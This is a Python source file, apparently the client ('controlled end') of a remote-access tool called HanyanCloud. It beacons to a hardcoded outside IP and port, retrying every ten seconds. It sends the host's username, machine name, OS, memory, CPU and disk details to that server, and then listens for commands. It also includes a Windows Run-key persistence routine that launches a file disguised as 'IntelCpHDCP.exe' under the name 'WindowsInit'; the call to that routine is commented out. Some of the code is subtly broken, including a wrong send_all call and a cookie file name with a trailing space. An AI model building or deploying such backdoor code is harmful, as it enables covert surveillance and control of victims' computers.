from socket import socket, AF_INET, SOCK_STREAM
from localFunction import SystemInfo
import win32con
import win32api
import os
import ast
import struct
import time

SERVER = '148.70.105.33'
INIT_INFORMATION = 'init_information'
GET_COOKIE = 'get_cookie'
POST = 52527


class HanyanCloud:
    def __init__(self):
        self.id = "PC"
        self.cookie = '-1'
        self.heard_struct = struct.Struct('!I')
        # self.addfile2autorun()
        self.clientSocket = socket(AF_INET, SOCK_STREAM)
        while True:
            try:
                self.clientSocket.connect((SERVER, POST))
                print("成功连接终端")
                break
            except ConnectionRefusedError:
                print("尝试重新连接...")
                time.sleep(10)
        try:
            cookie = open('./cookie', 'r')
            self.cookie = cookie.read()
            cookie.close()
        except IOError:
            cookie = open('./cookie ', 'w')
            self.send_all(SERVER, GET_COOKIE)
            self.cookie = self.recv_all()["cookie"]
            cookie.write(self.cookie)
            cookie.close()

        self.send_all(SERVER, INIT_INFORMATION, content=self.info_message())
        print("信息已发送")

    # 加入开机启动
    def addfile2autorun(self):
        path = os.getcwd()+"\IntelCpHDCP.exe"
        runpath = "Software\Microsoft\Windows\CurrentVersion\Run"
        hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_SET_VALUE)
        win32api.RegSetValueEx(hKey, "WindowsInit", 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(hKey)

    # 消息处理
    def message_processing(self, message):
        if message["function"] == "Hi":
            self.send_all(self.main_agreement("master", "request", "我是被控端"))

    # 发送报文方法
    def send_all(self, gold_address, _function, content={}):
        block = str(self.main_agreement(gold_address, _function, content)).encode('utf-8')
        block_length = len(block)
        self.clientSocket.sendall(self.heard_struct.pack(block_length))
        self.clientSocket.sendall(block)

    # 接受报文方法
    def recv_all(self):
        data = self.recvall(self.heard_struct.size)
        (content_length,) = self.heard_struct.unpack(data)
        return ast.literal_eval(self.recvall(content_length).decode('utf-8'))

    # 接受定长报文
    def recvall(self, length):
        blocks = []
        while length:
            block = self.clientSocket.recv(length)
            if not block:
                print("尝试重新连接...")
                while True:
                    try:
                        self.clientSocket.connect((SERVER, POST))
                        break
                    except ConnectionRefusedError:
                        time.sleep(10)
                        continue
            length -= len(block)
            blocks.append(block)
        return b''.join(blocks)

    def main_agreement(self, gold_address, _function, content):
        _id = self.id
        message = {"id": _id, "gold_address": gold_address, "cookie": self.cookie,
                   "function": _function, "content": content}
        return message

    def info_message(self):
        sysinfo = SystemInfo()
        content = {"data": {"username": sysinfo.get_username(), "homename": sysinfo.get_home_name(),
                            "System": sysinfo.get_sys_version(), "memory": sysinfo.get_mem(), "cpu": sysinfo.get_cpu(),
                            "disk": sysinfo.get_disk_info(), "time": sysinfo.get_time()}}
        return content

    def listen_request(self):
        while True:
            message = self.recv_all()
            self.message_processing(message)


hanyancloud = HanyanCloud()
hanyancloud.listen_request()
